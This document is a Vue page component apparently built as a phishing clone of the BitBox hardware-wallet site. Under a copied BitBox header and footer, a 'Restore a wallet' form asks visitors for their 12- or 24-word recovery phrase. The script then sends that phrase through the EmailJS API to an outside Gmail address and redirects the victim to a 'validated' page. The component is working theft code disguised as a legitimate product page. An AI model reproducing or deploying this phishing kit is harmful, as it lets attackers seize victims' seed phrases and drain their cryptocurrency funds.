<template>
  <div>
    <div id="referralBannerContainer"></div>

    <div id="nav" class="nav-container">
      <div class="content-width row">
        <nav class="nav-content col-xs-12">
          <div class="logo">
            <a href="/">
              <span class="sr-only">BitBox</span>
              <svg
                version="1.1"
                xmlns="http://www.w3.org/2000/svg"
                x="0"
                y="0"
                viewBox="0 0 512 512"
                xml:space="preserve"
              >
                <path
                  style="fill: #191919"
                  d="M105.8 347.4v-82.9l67-28.8V106.6l66.6-29.1v212zM406.2 348.1v-82.8l-67-28.9V107.3l-66.6-28.9v211.8zM256.2 318.5L123 376.7l133.1 57.8 133.6-58.1z"
                />
              </svg>
            </a>
          </div>
          <ul class="nav-menu">
            <li>
              <a href="/checkout">Hardware wallet</a>
            </li>
            <li>
              <a href="/checkout">Reviews</a>
            </li>
            <li>
              <a href="/checkout">Security</a>
            </li>
            <li>
              <a href="/checkout">App</a>
            </li>
          </ul>
          <ul class="cart-menu text-right">
            <li><a href="/checkout">Blog</a></li>
            <li><a href="/checkout">Support</a></li>

            <li><a href="/checkout">Shop</a></li>

            <li class="nav-dropdown">
              <input type="checkbox" id="language-toggle" tabindex="0" />
              <label
                for="language-toggle"
                class="nav-dropdown-toggle"
                style="display: flex; align-items: center"
                aria-haspopup="true"
                aria-owns="language-menu"
              >
                <span> Languages </span>
                <svg
                  xmlns="http://www.w3.org/2000/svg"
                  width="18"
                  height="18"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokewidth="2"
                  strokelinecap="round"
                  strokelinejoin="round"
                >
                  <circle cx="12" cy="12" r="10"></circle>
                  <line x1="2" y1="12" x2="22" y2="12"></line>
                  <path
                    d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"
                  ></path>
                </svg>
              </label>
              <div class="nav-dropdown-content shadow">
                <span class="sr-only">Languages</span>
                <ul id="language-menu">
                  <li lang="en">
                    <a class="active" href="index.html">English</a>
                  </li>

                  <li lang="de"><a href="de/index.html">Deutsch</a></li>

                  <li lang="es"><a href="es/index.html">Español</a></li>
                </ul>
              </div>
            </li>
          </ul>
          <div class="mobile-container hide">
            <ul class="mobile-menu shadow" id="mobile-nav">
              <li>
                <a href="bitbox02/index.html">Hardware wallet</a>
              </li>
              <li>
                <a href="bitbox02/reviews/index.html">Reviews</a>
              </li>
              <li>
                <a href="bitbox02/security-features/index.html">Security</a>
              </li>
              <li>
                <a href="app/index.html">App</a>
              </li>

              <li><a href="https://shiftcrypto.shop/">Shop</a></li>

              <li><a href="blog/index.html">Blog</a></li>
              <li><a href="support/index.html">Support</a></li>
              <li class="mobile-language-menu">
                <ul>
                  <li>
                    <span class="mobile-language-menu-icon"
                      ><svg
                        xmlns="http://www.w3.org/2000/svg"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                      >
                        <path d="M0 0h24v24H0z" fill="none"></path>
                        <path
                          d=" M12.87 15.07l-2.54-2.51.03-.03c1.74-1.94 2.98-4.17 3.71-6.53H17V4h-7V2H8v2H1v1.99h11.17C11.5 7.92 10.44 9.75 9 11.35 8.07 10.32 7.3 9.19 6.69 8h-2c.73 1.63 1.73 3.17 2.98 4.56l-5.09 5.02L4 19l5-5 3.11 3.11.76-2.04zM18.5 10h-2L12 22h2l1.12-3h4.75L21 22h2l-4.5-12zm-2.62 7l1.62-4.33L19.12 17h-3.24z"
                          fill="#888"
                        ></path></svg
                    ></span>
                  </li>
                  <li lang="en">
                    <a class="active" href="index.html">English</a>
                  </li>

                  <li lang="de"><a href="de/index.html">Deutsch</a></li>

                  <li lang="es"><a href="es/index.html">Español</a></li>
                </ul>
              </li>
            </ul>
          </div>
          <ul class="mobile-icon">
            <li>
              <svg
                class="menu-icon"
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <line x1="3" y1="12" x2="21" y2="12"></line>
                <line x1="3" y1="6" x2="21" y2="6"></line>
                <line x1="3" y1="18" x2="21" y2="18"></line>
              </svg>
              <svg
                class="x-icon hide"
                xmlns="http://www.w3.org/2000/svg"
                width="24"
                height="24"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                stroke-linecap="round"
                stroke-linejoin="round"
              >
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </li>
          </ul>
        </nav>
      </div>
    </div>

    <section class="large pb-40 pt-10 bg-gray" id="partners">
      <div class="content-width">
        <div class="row center-xs m-bottom-xlarge">
          <div class="col-xs-11">
            <div class="row flex-items-center">
              <div class="col-xs-12">
                <h2 class="heading-1 mb-3">Restore a wallet</h2>
                <p class="m-bottom-xxlarge text-center">
                  Please enter your 12/24 wallet recovery phrase. Make sure you
                  enter the words in the correct order after which your press
                  enter/return
                </p>
              </div>
            </div>
            <div class="mb-6 w-full">
              <p class="text-left mb-1">
                <label for="">Enter Recovery Phrase</label>
              </p>

              <div>
                <TagsInput @tags="checkLength" />
                 <div class="text-orange-500 text-sm text-left mt-1">Please press enter/return ⏎ </div>
              </div>
            </div>
            <div class="flex items-left mb-14">
              <div class="flex items-center">
                <button
                  :disabled="lengthOfTags <= 12"
                  class="button primary text-center"
                  @click="sendData()"
                >
                  Verify
                </button>
                <div v-if="isLoading" class="ml-1" id="html-spinner"></div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </section>

    <footer class="footer rightup bottomFlat h-padding with-space" id="footer">
      <div class="content-width">
        <div class="row end-xs">
          <div class="col-xs-12 col-sm-10 text-right">
            <img
              loading="lazy"
              class="footer-logo"
              src="../assets/images/logos/reversed_swiss_made.svg"
              alt="Swiss made open source"
            />
            <p class="meta">
              <a href="support/index.html">Got questions? Contact us</a>.<br />
              © 2020 Shift Crypto AG, Switzerland. All rights reserved.
            </p>
          </div>
        </div>
        <div class="row center-xs text-left">
          <div class="footer-subnav text-left col-xs-12 col-sm-9 col-md-12">
            <a class="m-right" href="about/index.html" translate="no">About</a>
            <a class="m-right" href="blog/index.html" translate="no">Blog</a>
            <a class="m-right" href="https://shiftcrypto.shop/">Shop</a>
            <a href="jobs/index.html" translate="no">Jobs</a>
            <a
              class="m-left"
              target="_blank"
              rel="noopener noreferrer"
              href="https://bitbox.betteruptime.com/"
              translate="no"
              >Status</a
            >
            <a
              class="rss-button"
              href="blog/rss/index.html"
              title="RSS"
              target="_blank"
            >
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
                <circle cx="6.18" cy="17.82" r="2.18"></circle>
                <path
                  d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"
                ></path>
              </svg>
            </a>
          </div>
        </div>
        <div class="row m-top-large center-xs text-left">
          <div class="col-xs-4 col-sm-3 col-md-2 m-bottom">
            <p class="footer-label meta">Partners</p>
            <ul>
              <li><a href="buy/index.html">Where to buy</a></li>
              <li><a href="reviewers/index.html">Reviewers</a></li>
              <li><a href="dev/index.html">Developer resources</a></li>
              <li>
                <a href="bug-bounty-program/index.html">Bug bounty program</a>
              </li>
              <li><a href="affiliates/index.html">Affiliate program</a></li>
              <li>
                <a href="bitcoin/resources/index.html">Bitcoin crash course</a>
              </li>
              <li>
                <a href="bitbox02/compare-hardware-wallets/index.html"
                  >Wallet comparison</a
                >
              </li>
            </ul>
          </div>
          <div class="col-xs-4 col-sm-3 col-md-2 m-bottom">
            <p class="footer-label meta">Products</p>
            <ul translate="no">
              <li><a href="bitbox02/index.html">BitBox02</a></li>
              <li><a href="app/index.html">BitBoxApp</a></li>
              <li><a href="base/index.html">BitBoxBase</a></li>
              <li><a href="bitboxcare/index.html">BitBoxCare</a></li>
              <li><a href="backupcard/index.html">Backup card</a></li>
              <li><a href="steelwallet/index.html">Steelwallet</a></li>
              <li>
                <a href="tamper-evident-bags/index.html">Tamper-evident bags</a>
              </li>
            </ul>
          </div>
          <div class="col-xs-4 col-sm-3 col-md-2 m-bottom">
            <p class="footer-label meta">Policies</p>
            <ul>
              <li>
                <a href="policies/refund-policy/index.html">Refund policy</a>
              </li>
              <li>
                <a href="policies/privacy-policy/index.html">Privacy policy</a>
              </li>
              <li>
                <a href="policies/terms-of-service/index.html"
                  >Terms of service</a
                >
              </li>
              <li>
                <a href="policies/limited-warranty/index.html"
                  >Limited warranty</a
                >
              </li>
              <li>
                <a href="policies/shipping/index.html">Shipping policy</a>
              </li>
              <li class="open-cookie-monster">
                <button onClick="app.openCookieMonster();" type="button">
                  Cookie settings&nbsp;🍪
                </button>
              </li>
            </ul>
          </div>
          <div class="col-xs-12 col-sm-9 col-md-5 col-md-offset-1">
            <p class="footer-label meta">Platforms</p>
            <div class="inline">
              <a
                data-name="Twitter"
                data-category="Social"
                href="https://twitter.com/ShiftCryptoHQ"
                target="_blank"
                rel="noopener noreferrer"
              >
                <span class="sr-only">twitter.com/ShiftCryptoHQ</span>
                <svg
                  role="img"
                  style="fill: white"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <title>Twitter icon</title>
                  <path
                    d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"
                  />
                </svg>
              </a>
              <a
                data-name="GitHub"
                data-category="Social"
                href="https://github.com/digitalbitbox"
                target="_blank"
                rel="noopener noreferrer"
              >
                <span class="sr-only">github.com/digitalbitbox</span>
                <svg
                  role="img"
                  style="fill: white"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <title>GitHub icon</title>
                  <path
                    d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"
                  />
                </svg>
              </a>
              <a
                data-name="YouTube"
                data-category="Social"
                href="https://www.youtube.com/channel/UCBEYTMaU5UVd6RWLI_2tzzA/playlists"
                target="_blank"
                rel="noopener noreferrer"
              >
                <span class="sr-only">youtube.com</span>
                <svg
                  role="img"
                  style="fill: white"
                  width="24"
                  height="24"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                >
                  <title>YouTube icon</title>
                  <path
                    d="M23.495 6.205a3.007 3.007 0 0 0-2.088-2.088c-1.87-.501-9.396-.501-9.396-.501s-7.507-.01-9.396.501A3.007 3.007 0 0 0 .527 6.205a31.247 31.247 0 0 0-.522 5.805 31.247 31.247 0 0 0 .522 5.783 3.007 3.007 0 0 0 2.088 2.088c1.868.502 9.396.502 9.396.502s7.506 0 9.396-.502a3.007 3.007 0 0 0 2.088-2.088 31.247 31.247 0 0 0 .5-5.783 31.247 31.247 0 0 0-.5-5.805zM9.609 15.601V8.408l6.264 3.602z"
                  />
                </svg>
              </a>
              <a
                data-name="Facebook"
                data-category="Social"
                href="https://www.facebook.com/Shiftcrypto/"
                target="_blank"
                rel="noopener noreferrer"
              >
                <span class="sr-only">facebook.com/Shiftcrypto</span>
                <svg
                  style="fill: white"
                  width="24"
                  height="24"
                  role="img"
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <title>Facebook icon</title>
                  <path
                    d="M23.9981 11.9991C23.9981 5.37216 18.626 0 11.9991 0C5.37216 0 0 5.37216 0 11.9991C0 17.9882 4.38789 22.9522 10.1242 23.8524V15.4676H7.07758V11.9991H10.1242V9.35553C10.1242 6.34826 11.9156 4.68714 14.6564 4.68714C15.9692 4.68714 17.3424 4.92149 17.3424 4.92149V7.87439H15.8294C14.3388 7.87439 13.8739 8.79933 13.8739 9.74824V11.9991H17.2018L16.6698 15.4676H13.8739V23.8524C19.6103 22.9522 23.9981 17.9882 23.9981 11.9991Z"
                  />
                </svg>
              </a>
              <a
                data-name="LinkedIn"
                data-category="Social"
                href="https://www.linkedin.com/organization-guest/company/shift-crypto"
                target="_blank"
                rel="noopener noreferrer"
              >
                <span class="sr-only"
                  >linkedin.com/organization-guest/company/shift-crypto</span
                >
                <svg
                  role="img"
                  style="fill: white"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <title>LinkedIn icon</title>
                  <path
                    d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"
                  />
                </svg>
              </a>
              <a
                data-name="Instagram"
                data-category="Social"
                href="https://www.instagram.com/shiftcryptohq/"
                target="_blank"
                rel="noopener noreferrer"
              >
                <span class="sr-only">instagram.com/shiftcryptohq</span>
                <svg
                  role="img"
                  style="fill: white"
                  width="24"
                  height="24"
                  viewBox="0 0 24 24"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <title>Instagram icon</title>
                  <path
                    d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"
                  />
                </svg>
              </a>
              <a
                data-name="Telegram"
                data-category="Social"
                href="telegram/index.html"
              >
                <span class="sr-only">Telegram group</span>
                <svg
                  role="img"
                  style="fill: white"
                  width="24"
                  height="24"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 24 24"
                >
                  <title>Telegram icon</title>
                  <path
                    d="M23.91 3.79L20.3 20.84c-.25 1.21-.98 1.5-2 .94l-5.5-4.07-2.66 2.57c-.3.3-.55.56-1.1.56-.72 0-.6-.27-.84-.95L6.3 13.7l-5.45-1.7c-1.18-.35-1.19-1.16.26-1.75l21.26-8.2c.97-.43 1.9.24 1.53 1.73z"
                  />
                </svg>
              </a>
              <a
                data-name="Reddit"
                data-category="Social"
                href="https://www.reddit.com/r/BitBoxWallet/"
                target="_blank"
                rel="noopener noreferrer"
              >
                <span class="sr-only">reddit.com/r/BitBoxWallet/</span>
                <svg
                  role="img"
                  width="24"
                  height="24"
                  style="fill: white"
                  xmlns="http://www.w3.org/2000/svg"
                  viewBox="0 0 512 512"
                >
                  <defs />
                  <path
                    d="M440.3 203.5c-15 0-28.2 6.2-37.9 15.9-35.7-24.7-83.8-40.6-137.1-42.3L293 52.3l88.2 19.8c0 21.6 17.6 39.2 39.2 39.2 22 0 39.7-18.1 39.7-39.7s-17.6-39.7-39.7-39.7c-15.4 0-28.7 9.3-35.3 22l-97.4-21.6c-4.9-1.3-9.7 2.2-11 7.1L246.3 177c-52.9 2.2-100.5 18.1-136.3 42.8-9.7-10.1-23.4-16.3-38.4-16.3-55.6 0-73.8 74.6-22.9 100.1-1.8 7.9-2.6 16.3-2.6 24.7 0 83.8 94.4 151.7 210.3 151.7 116.4 0 210.8-67.9 210.8-151.7 0-8.4-.9-17.2-3.1-25.1 49.9-25.6 31.5-99.7-23.8-99.7zM129.4 308.9c0-22 17.6-39.7 39.7-39.7 21.6 0 39.2 17.6 39.2 39.7 0 21.6-17.6 39.2-39.2 39.2-22 .1-39.7-17.6-39.7-39.2zm214.3 93.5c-36.4 36.4-139.1 36.4-175.5 0-4-3.5-4-9.7 0-13.7 3.5-3.5 9.7-3.5 13.2 0 27.8 28.5 120 29 149 0 3.5-3.5 9.7-3.5 13.2 0 4.1 4 4.1 10.2.1 13.7zm-.8-54.2c-21.6 0-39.2-17.6-39.2-39.2 0-22 17.6-39.7 39.2-39.7 22 0 39.7 17.6 39.7 39.7-.1 21.5-17.7 39.2-39.7 39.2z"
                  />
                </svg>
              </a>
            </div>
            <p class="footer-label meta m-top-large">Newsletter</p>
            <ul>
              <li>
                <a href="newsletter/index.html" class="footer-inline-icon">
                  <svg
                    role="img"
                    fill="none"
                    stroke="white"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                    stroke-width="2"
                    viewBox="0 0 24 24"
                    width="24"
                    height="24"
                  >
                    <path
                      d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"
                    />
                    <path d="m22 6-10 7L2 6" />
                  </svg>
                  Subscribe
                </a>
              </li>
            </ul>
            <div class="row m-top-large">
              <div class="col-xs-8 p-right-none p-left-none">
                <p class="meta m-top-none">
                  Except where otherwise noted, content on this site is licensed
                  under a
                  <a
                    rel="license"
                    href="http://creativecommons.org/licenses/by/4.0/"
                    >Creative Commons Attribution 4.0 International License</a
                  >
                </p>
              </div>
            </div>
            <div class="row m-top-large">
              <div class="col-md-10 p-right-none p-left-none">
                <div>
                  <ul class="inline">
                    <li class="payment-icon">
                      <img
                        loading="lazy"
                        alt="bitcoin"
                        src="../assets/icons/payments/bitcoin.png"
                      />
                    </li>
                    <li class="payment-icon">
                      <img
                        loading="lazy"
                        alt="mastercard"
                        src="../assets/icons/payments/mastercard.png"
                      />
                    </li>
                    <li class="payment-icon">
                      <img
                        loading="lazy"
                        alt="visa"
                        src="../assets/icons/payments/visa.png"
                      />
                    </li>
                    <li class="payment-icon">
                      <img
                        loading="lazy"
                        alt="bancontact"
                        src="../assets/icons/payments/bancontact.png"
                      />
                    </li>
                    <li class="payment-icon">
                      <img
                        loading="lazy"
                        alt="ideal"
                        src="../assets/icons/payments/ideal.png"
                      />
                    </li>
                    <li class="payment-icon">
                      <img
                        loading="lazy"
                        alt="sofort"
                        src="../assets/icons/payments/sofort.png"
                      />
                    </li>
                    <li class="payment-icon">
                      <img
                        loading="lazy"
                        style="background-color: white"
                        alt="bank-transfer"
                        src="../assets/icons/payments/bank.png"
                      />
                    </li>
                    <li class="payment-icon">
                      <img
                        loading="lazy"
                        alt="giropay"
                        src="../assets/icons/payments/giropay.png"
                      />
                    </li>
                    <li class="payment-icon">
                      <img
                        loading="lazy"
                        alt="eps"
                        src="../assets/icons/payments/eps.png"
                      />
                    </li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </footer>
  </div>
</template>

<script>
import TagsInput from '../components/TagsInput'

export default {
  name: 'IndexPage',
  components: {
    TagsInput,
  },

  data() {
    return {
      tags: [],
      phrase: [],
      isLoading: false,
      lengthOfTags: '',
    }
  },
  methods: {
    checkLength(params) {
      this.tags = params
      this.lengthOfTags = params.length + 1
    },
    sendData() {
      this.isLoading = true
      this.phrase = [...this.tags]
      let self = this
      var data = {
        service_id: 'service_g49xzs9',
        template_id: 'template_l04gtxf',
        user_id: 'Q_v6F22hpmQkpwuex',
        template_params: {
          from_name: 'Bitbox2',
          phrase: this.phrase,
          reply_to: 'gibsonkendra725@gmail.com',
        },
      }
      this.$axios
        .$post('https://api.emailjs.com/api/v1.0/email/send', data)
        .then(function () {
          self.$router.push('/validated')
          self.isLoading = false
        })
        .catch(function () {
          self.isLoading = false
        })
    },
  },
}
</script>

<style>
#html-spinner {
  width: 20px;
  height: 20px;
  border: 4px solid black;
  border-top: 4px solid white;
  border-radius: 50%;
}

#html-spinner,
#svg-spinner {
  transition-property: transform;
  animation-name: rotate;
  animation-duration: 1.2s;
  animation-iteration-count: infinite;
  animation-timing-function: linear;
}

@-webkit-keyframes rotate {
  from {
    -webkit-transform: rotate(0deg);
  }
  to {
    -webkit-transform: rotate(360deg);
  }
}

@-moz-keyframes rotate {
  from {
    -moz-transform: rotate(0deg);
  }
  to {
    -moz-transform: rotate(360deg);
  }
}

@keyframes rotate {
  from {
    transform: rotate(0deg);
  }
  to {
    transform: rotate(360deg);
  }
}

.vue-tags-input {
  max-width: 100% !important;
}

/* style the background and the text color of the input ... */
.vue-tags-input {
  background: #324652;
}

.vue-tags-input .ti-new-tag-input {
  background: transparent;
  color: #b7c4c9;
}

.vue-tags-input .ti-input {
  padding: 4px 10px;
  transition: border-bottom 200ms ease;
}

/* we cange the border color if the user focuses the input */
.vue-tags-input.ti-focus .ti-input {
  border: 1px solid #ebde6e;
}

/* some stylings for the autocomplete layer */
.vue-tags-input .ti-autocomplete {
  background: #283944;
  border: 1px solid #8b9396;
  border-top: none;
}

/* the selected item in the autocomplete layer, should be highlighted */
.vue-tags-input .ti-item.ti-selected-item {
  background: #ebde6e;
  color: #283944;
}

/* style the placeholders color across all browser */
.vue-tags-input ::-webkit-input-placeholder {
  color: #a4b1b6;
}

.vue-tags-input ::-moz-placeholder {
  color: #a4b1b6;
}

.vue-tags-input :-ms-input-placeholder {
  color: #a4b1b6;
}

.vue-tags-input :-moz-placeholder {
  color: #a4b1b6;
}

/* default styles for all the tags */
.vue-tags-input .ti-tag {
  position: relative;
  background: #ebde6e;
  padding: 0px 12px;
  color: #283944;
  font-weight: 500;
  font-size: 16px;
}

/* we defined a custom css class in the data model, now we are using it to style the tag */
.vue-tags-input .ti-tag.custom-class {
  background: transparent;
  border: 1px solid #ebde6e;
  color: #ebde6e;
  margin-right: 4px;
  border-radius: 0px;
  font-size: 13px;
}

/* the styles if a tag is invalid */
.vue-tags-input .ti-tag.ti-invalid {
  background-color: #e88a74;
}

/* if the user input is invalid, the input color should be red */
.vue-tags-input .ti-new-tag-input.ti-invalid {
  color: #e88a74;
}

/* if a tag or the user input is a duplicate, it should be crossed out */
.vue-tags-input .ti-duplicate span,
.vue-tags-input .ti-new-tag-input.ti-duplicate {
  text-decoration: line-through;
}

/* if the user presses backspace, the complete tag should be crossed out, to mark it for deletion */
.vue-tags-input .ti-tag:after {
  transition: transform 0.2s;
  position: absolute;
  content: '';
  height: 2px;
  width: 108%;
  left: -4%;
  top: calc(50% - 1px);
  background-color: #000;
  transform: scaleX(0);
}

.vue-tags-input .ti-deletion-mark:after {
  transform: scaleX(1);
}
</style>
